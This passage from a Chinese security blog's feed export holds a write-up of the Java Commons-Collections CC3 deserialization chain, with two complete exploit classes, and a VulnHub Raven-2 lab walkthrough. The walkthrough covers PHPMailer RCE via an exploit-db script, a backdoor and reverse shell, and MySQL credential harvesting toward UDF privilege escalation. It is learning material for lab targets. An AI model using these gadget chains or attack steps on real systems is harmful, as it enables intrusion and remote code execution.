EXP</h2><p>ÈÄöËøá<code>InstantiateTransformer</code>Êù•Ë∞ÉÁî®<code>TrAXFilter</code>Á±ªÁöÑÊûÑÈÄ†ÊñπÊ≥ïËß£ÂÜ≥Â¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);  </span><br><span class="line">instantiateTransformer.transform(TrAXFilter.class);</span><br></pre></td></tr></table></figure><p>ÊµãËØïÊàêÂäüÔºåÁÑ∂Âêé‰ΩøÁî®CC1ÁöÑÂâçÂçäÈÉ®ÂàÜÂéªË∞ÉtransformÊñπÊ≥ï</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);  </span><br><span class="line"><span class="comment">//        instantiateTransformer.transform(TrAXFilter.class);  </span></span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  instantiateTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);  </span><br><span class="line">        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  </span><br><span class="line">        <span class="comment">//InvocationHandlerËß£ÂÜ≥proxyMap‰∏çËÉΩÂ∫èÂàóÂåñÔºåÁÑ∂ÂêéÈÄöËøáÊûÑÈÄ†ÊñπÊ≥ïÂ∞Ü‰ª£ÁêÜÂØπË±°proxyMapËµãÂÄºÁªômemberValues  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//Â∫èÂàóÂåñ‰∏éÂèçÂ∫èÂàóÂåñ  </span></span><br><span class="line"><span class="comment">//        serialize(invocationHandler);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>‰ΩÜÊòØÂèëÁé∞Âú®ÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôÊä•ÈîôÔºåËøôÈáåËøòÊòØCC1ÁöÑ<code>setValue()</code> ÁöÑ‰º†ÂèÇÊó†Ê≥ïÊéßÂà∂ÔºåÈúÄË¶ÅÂºïÂÖ• <code>Transformer</code> ‰∏é <code>ChainedTransformer</code> ËæÖÂä©ÔºåÊîπ‰∫ÜÂêéÁöÑEXPÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        templates.newTransformer();  </span></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),  </span><br><span class="line">                instantiateTransformer  </span><br><span class="line">        &#125;;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  </span><br><span class="line">        <span class="comment">//InvocationHandlerËß£ÂÜ≥proxyMap‰∏çËÉΩÂ∫èÂàóÂåñÔºåÁÑ∂ÂêéÈÄöËøáÊûÑÈÄ†ÊñπÊ≥ïÂ∞Ü‰ª£ÁêÜÂØπË±°proxyMapËµãÂÄºÁªômemberValues  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//Â∫èÂàóÂåñ‰∏éÂèçÂ∫èÂàóÂåñ  </span></span><br><span class="line"><span class="comment">//        serialize(invocationHandler);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031737151.png" alt="image-20230603173731054"><br>ÈìæÂ≠êÁªìÊùü„ÄÇË∑üÂÆåÂèëÁé∞Ëá™Â∑±ÂØπ‰∫éCC1ÁöÑÁêÜËß£ËøòÊòØ‰∏çÂ§üÈÄèÂΩªÔºåÂæóÂéªÂ§ç‰π†‰∏Ä‰∏ã‰∫ÜÔºåCCÈìæËøô‰∏ÄÂùóËøòÊòØÂæàÈáçË¶ÅÔºåÂØπ‰∫éÂêéÁª≠ÂÖ∂ÂÆÉÁöÑÈìæÂ≠¶‰π†ÁÆóÊòØÊâì‰∏ãÂü∫Á°Ä</p><h2 id="ÊµÅÁ®ãÂõæ"><a href="#ÊµÅÁ®ãÂõæ" class="headerlink" title="ÊµÅÁ®ãÂõæ"></a>ÊµÅÁ®ãÂõæ</h2><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031737924.png" alt="image-20230603173740854"><br>ËøôÊù°ÈìæÂ≠êÂ∞±Áõ∏ÂΩì‰∫éÁªô‰∫ÜÂëΩ‰ª§ÊâßË°åÁöÑÂè¶‰∏ÄÁßçÊñπÊ≥ïÔºåÂ¶ÇÊûú<code>InvokerTransform</code>Âíå<code>Runtime</code>Ë¢´Âäû‰∫ÜÂ∞±ÂèØ‰ª•Áî®Ëøô‰∏ÄÊù°Êù•ÁªïËøá</p>]]></content>
      
      
      <categories>
          
          <category> JavaÂÆâÂÖ® </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub-Raven-2</title>
      <link href="/2023/05/VulnHub-Raven-2/"/>
      <url>/2023/05/VulnHub-Raven-2/</url>
      
        <content type="html"><![CDATA[<h2 id="Èù∂Êú∫Âú∞ÂùÄ"><a href="#Èù∂Êú∫Âú∞ÂùÄ" class="headerlink" title="Èù∂Êú∫Âú∞ÂùÄ"></a>Èù∂Êú∫Âú∞ÂùÄ</h2><p><code>https://www.vulnhub.com/entry/raven-2,269/</code></p><h2 id="flag‚Äî1"><a href="#flag‚Äî1" class="headerlink" title="flag‚Äî1"></a>flag‚Äî1</h2><p>Êâ´ÊèèÂ≠òÊ¥ª‰∏ªÊú∫<br><code>arp-scan -l</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301511958.png" alt="image-20230530151117902"><br>ÈÄöËøáÈù∂Êú∫macÂú∞ÂùÄÂà§Êñ≠IP‰∏∫<code>192.168.75.135</code>ÁÑ∂ÂêénmapÊâ´‰∏Ä‰∏ãÔºåÁúãÁúãÂºÄÊîæÁ´ØÂè£<br><code>nmap -A -p- -v  192.168.75.135</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301511132.png" alt="image-20230530151136092"><br>‰∏â‰∏™ÂºÄÊîæÁ´ØÂè£ÔºåÁÑ∂ÂêédirsearchÊâ´‰∏Ä‰∏ãÁõÆÂΩï<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301511273.png" alt="image-20230530151147237"><br>ËÆøÈóÆ&#x2F;vendorÂ≠òÂú®‰∏Ä‰∏™ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥ûÔºåÂú®PATH‰∏ãÊâæÂà∞flag1<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301512438.png" alt="image-20230530151208411"></p><h2 id="flag‚Äî2Ôºå3"><a href="#flag‚Äî2Ôºå3" class="headerlink" title="flag‚Äî2Ôºå3"></a>flag‚Äî2Ôºå3</h2><p>ËÆøÈóÆREADME.mdÂèëÁé∞Â≠òÂú®‰∏Ä‰∏™phpmailerÊúçÂä°ÔºåÂπ∂‰∏îÂú®VERSION‰∏ãÁúãÁöÑÁâàÊú¨‰∏∫5.2.16Êêú‰∫Ü‰∏Ä‰∏ã18‰ª•‰∏ãÂ≠òÂú®<strong>PHPMailerËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û</strong>Êú¨Êù•ÊÉ≥ÊâãÂ∑•Âà©Áî®Ôºå‰ΩÜÊòØÂ§±Ë¥•‰∫ÜÔºåÁõ¥Êé•Âà©Áî®<strong>searchsploit</strong>ÊêúÁ¥¢ÂèØ‰ª•Âà©Áî®ÁöÑÊºèÊ¥û<br><code>searchsploit PHPMailer</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301512376.png" alt="image-20230530151222302"><br>Â∞ÜpythonÈÇ£Êù°expÊã∑Ë¥ùÂá∫Êù•ÔºåÁÑ∂Âêé‰øÆÊîπÁõÆÊ†áÂú∞ÂùÄÂíåÂèçÂºπshellÁöÑÂú∞ÂùÄ‰ª•Âèä‰∏ä‰º†ÁöÑË∑ØÂæÑ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/40974.py /home/joker27/Ê°åÈù¢</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301512462.png" alt="image-20230530151238409"><br>ÁÑ∂ÂêéÊâßË°åexpÁîüÊàêÂêéÈó®Êñá‰ª∂<br><code>python 40974.py</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301512317.png" alt="image-20230530151254251"><br>ÁõëÂê¨Á´ØÂè£ÔºåÂÖàËÆøÈóÆ<a href="http://192.168.75.135/contact.php%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%EF%BC%8C%E7%84%B6%E5%90%8E%E8%AE%BF%E9%97%AE%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%E5%8F%8D%E5%BC%B9%E6%88%90%E5%8A%9F">http://192.168.75.135/contact.phpÁîüÊàêÂêéÈó®Êñá‰ª∂ÔºåÁÑ∂ÂêéËÆøÈóÆÂêéÈó®Êñá‰ª∂ÂèçÂºπÊàêÂäü</a><br>‰ΩøÁî®pythonËé∑Âæó‰∏Ä‰∏™‰∫§‰∫íÂºèshell<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br>Êü•ÁúãÊùÉÈôêÔºåÊòØ‰∏Ä‰∏™www-dataÊùÉÈôêÂæà‰Ωé<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301513510.png" alt="image-20230530151311480"><br>‰ΩøÁî®ÂëΩ‰ª§<code>find / -name &quot;flag*&quot;</code>Áõ¥Êé•ÊêúÁ¥¢flagÔºåÊü•Âà∞flag2Âíå3<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301513241.png" alt="image-20230530151323212"><br>flag2Áõ¥Êé•ÂëΩ‰ª§ÊâìÂºÄÂ∞±Ë°åÔºåflag3ÊòØ‰∏ÄÂº†ÂõæÁâáÂú®web‰∏ãËÆøÈóÆ<code>http://192.168.75.135/wordpress/wp-content/uploads/2018/11/flag3.png</code>Âç≥ÂèØÂæóÂà∞ÔºåÊúÄÂêé‰∏Ä‰∏™flagËÇØÂÆöÂ∞±Ë¶ÅÊèêÊùÉ‰∫Ü</p><h2 id="flag‚Äì4-udfÊèêÊùÉ"><a href="#flag‚Äì4-udfÊèêÊùÉ" class="headerlink" title="flag‚Äì4(udfÊèêÊùÉ)"></a>flag‚Äì4(udfÊèêÊùÉ)</h2><p>‰ª•ÂâçÂè™‰∫ÜËß£‰ΩÜÊòØÊ≤°Áé©ËøáudfÊèêÊùÉ‰πüÊòØÊãøËøô‰∏™Èù∂Âú∫ÁªÉÁªÉ<br>‰ΩøÁî®LinEnum.shÂØπLinuxËøõË°å‰ø°ÊÅØÊêúÈõÜÔºåÈ°πÁõÆÂú∞ÂùÄÔºö<code>https://github.com/rebootuser/LinEnum</code><br>Âà©Áî®pythonËµ∑‰∏Ä‰∏™‰∏¥Êó∂webÊúçÂä°Ôºåpython3‰∏ãËøêË°å<code>python -m http.server</code><br>ÊúçÂä°ÈªòËÆ§Á´ØÂè£8000ÔºåÂà©Áî®Ëøô‰∏™ÊúçÂä°Â∞ÜLinEnum.shÊñá‰ª∂‰∏ä‰º†Âà∞Èù∂Êú∫‰∏äËøêË°åÔºåËøô‰∏™ÊñπÊ≥ïÂú®<strong>Vulnhub‚Äî‚ÄîAi-Web1</strong>‰πüÊúâËøêÁî®Ôºå‰∏çÁü•ÈÅìÁöÑÂèØ‰ª•ÂèÇËÄÉÊàëÂâçÈù¢ÁöÑÊñáÁ´†ÔºåÁÑ∂Âêé‰ΩøÁî®wgetËøúÁ®ã‰∏ãËΩΩshÊñá‰ª∂<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301513476.png" alt="image-20230530151348411"><br>ÁÑ∂ÂêéËøêË°åËøô‰∏™Êñá‰ª∂ÔºåÈúÄË¶ÅÂä†ÊùÉËøêË°å</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x LinEnum.sh</span><br><span class="line">./LinEnum.sh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301514588.png" alt="image-20230530151402551"><br>Âá∫Êù•ÁöÑ‰ø°ÊÅØÂæàÂ§öÔºåÂèëÁé∞mysqlÊòØÂú®root‰∏ãËøêË°åÁöÑÔºåÂÖ∂ÂÆû‰πüÂèØ‰ª•ÊâßË°åÂëΩ‰ª§<code>ps aux | grep root</code>Êü•Áúã‰ª•rootËøêË°åÁöÑËøõÁ®ã<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301514838.png" alt="image-20230530151412795"><br>ÊâÄ‰ª•Â¶ÇÊûúÊï∞ÊçÆÂ∫ìÁâàÊú¨‰∏çÊòØÂæàÈ´ò(&lt;&#x3D; 5.7.14Ôºå5.6.32Ôºå5.5.51)Â∞±ÂèØ‰ª•Áî®udfÊù•ÊèêÊùÉÔºåÂ∞±‰∏ãÊù•Â∞±ÊòØÊÉ≥ÂäûÊ≥ïÂæóÂà∞Êï∞ÊçÆÂ∫ìÁâàÊú¨ÔºåÊúÄÁªàÂú®Â¶Ç‰∏ãÈÖçÁΩÆÊñá‰ª∂ÂæóÂà∞mysqlÁöÑË¥¶Âè∑ÂØÜÁ†Å<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301514005.png" alt="image-20230530151425953"><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301514656.png" alt="image-20230530151438618"><br>ËøûÊé•Êï∞ÊçÆÂ∫ì<code>mysql -uroot -pR@v3nSecurity</code><br>Êü•ËØ¢Êï∞ÊçÆÂ∫ìÁâàÊú¨<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301514125.png" alt="image-20230530151450089"><br><strong>Êü•Áúã secure_file_priv  ÁöÑÂÄº</strong><br>secure_file_priv ÊòØÁî®Êù•ÈôêÂà∂ load 